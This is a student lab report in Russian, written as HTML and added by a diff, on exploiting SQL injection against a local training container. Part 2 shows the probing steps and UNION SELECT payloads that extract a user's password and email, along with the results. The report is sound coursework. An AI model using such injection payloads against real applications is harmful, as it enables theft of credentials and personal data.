@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Отчет по ЛР 2 - ИБ</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 40px; line-height: 1.6; color: #333; background-color: #f9f9f9; }
+        h1, h2 { color: #2c3e50; border-bottom: 2px solid #eee; padding-bottom: 10px; }
+        code { background-color: #eee; padding: 2px 5px; border-radius: 4px; font-family: monospace; }
+        .request-box { background: #f0f0f0; border-left: 5px solid #3498db; padding: 10px; margin: 10px 0; word-break: break-all; }
+        .result-box { background: #e8f8f5; border-left: 5px solid #27ae60; padding: 10px; margin: 10px 0; }
+        hr { border: 0; height: 1px; background: #ddd; margin: 30px 0; }
+    </style>
+</head>
+<body>
+    <h1>Отчет по лабораторной работе №2</h1>
+    <p><strong>Тема:</strong> Эксплуатация веб-уязвимостей (SQL-инъекция)</p>
+    <p><em>Студент: Токарев Валерий</em><br>
+    <em>Группа: БИВТ-24-9</em></p>
+
+    <h2>🌐 Часть 1. Аналитика</h2>
+    <p>Для начала глянул статистику по атакам. Взял отчеты от <strong>Positive Technologies</strong> и <strong>Verizon</strong> за прошлый год.</p>
+    <ul>
+        <li><strong>Вектор атаки:</strong> Около 40% всех взломов начинаются через уязвимости веб-приложений.</li>
+        <li><strong>Популярность SQLi:</strong> Инъекции стабильно держат 2-3 место в топе, особенно там, где старый код.</li>
+        <li><strong>Распределение:</strong> Нарушение доступа (32%), Инъекции (24%), Уязвимые компоненты (18%).</li>
+    </ul>
+
+    <hr>
+
+    <h2>💻 Часть 2. Практика (SQL Injection)</h2>
+    <p>Контейнир поднял, базу заполнил. Дальше начал "простукивать" эндпоинты.</p>
+
+    <h3>1. Поиск уязвимости</h3>
+    <p>Попробывал подставить кавычку в параметр ID. База ругнулась, значит входные данные не фильтруются.</p>
+    <div class="request-box"><code>http://localhost:8080/user?id=1'</code></div>
+
+    <h3>2. Подбор колонок</h3>
+    <p>Через <code>ORDER BY</code> нашел, что в выборке всего 2 столбца. На цифре 3 страница упала.</p>
+    <div class="request-box"><code>http://localhost:8080/user?id=1 ORDER BY 2--</code></div>
+
+    <h3>3. Эксплуатация</h3>
+    <p>Выяснил названия таблицы (<code>users_data</code>) и колонок через <code>information_schema</code>. Запросы были длинные, пришлось повозиться с кавычками.</p>
+
+    <h4>Задание 1: Пароль Volk2</h4>
+    <div class="request-box"><code>http://localhost:8080/user?id=-1 UNION SELECT login, secret_pass FROM users_data WHERE login='Volk2'--</code></div>
+    <div class="result-box"><strong>Пароль:</strong> Wa spoiuuuuu</div>
+
+    <h4>Задание 2: Почта Vinni-pukh</h4>
+    <div class="request-box"><code>http://localhost:8080/user?id=-1 UNION SELECT login, user_email FROM users_data WHERE login='Vinni-pukh'--</code></div>
+    <div class="result-box"><strong>Email:</strong> honey_lover@otus-lab.com</div>
+
+    <h3>Вывод</h3>
+    <p>В общем, лаба полезная. Понял, как работают UNION-инъекции. Главное — не забывать комментировать хвост запроса через <code>--</code>, а то ниче не работает.</p>
+</body>
+</html>
